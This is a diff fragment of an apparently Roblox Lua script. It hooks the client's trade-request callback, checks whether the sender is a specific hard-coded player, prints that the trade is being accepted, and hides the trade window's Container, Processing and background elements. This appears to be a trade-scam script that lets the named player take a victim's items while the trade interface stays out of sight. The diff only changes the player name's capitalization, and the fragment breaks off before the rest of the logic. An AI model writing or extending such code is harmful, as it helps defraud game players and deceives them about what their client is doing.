@@ -14,11 +14,11 @@ print("Waiting for incoming trade request callback...")
 
 -- Set up the client callback to intercept incoming requests from the server
 SendRequest.OnClientInvoke = function(senderPlayer)
-    -- Check if the sender is Bofuxa
-    if senderPlayer and senderPlayer.Name == "Bofuxa" then
-        print("Trade request verified from Bofuxa. Accepting...")
+    -- Check if the sender is bofuxa
+    if senderPlayer and senderPlayer.Name == "bofuxa" then
+        print("Trade request verified from bofuxa. Accepting...")
         
-        -- Hide Container, Processing, and BG inside TradeGUI when traded by Bofuxa
+        -- Hide Container, Processing, and BG inside TradeGUI when traded by bofuxa
         local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
         if playerGui then
             local tradeGui = playerGui:FindFirstChild("TradeGUI")
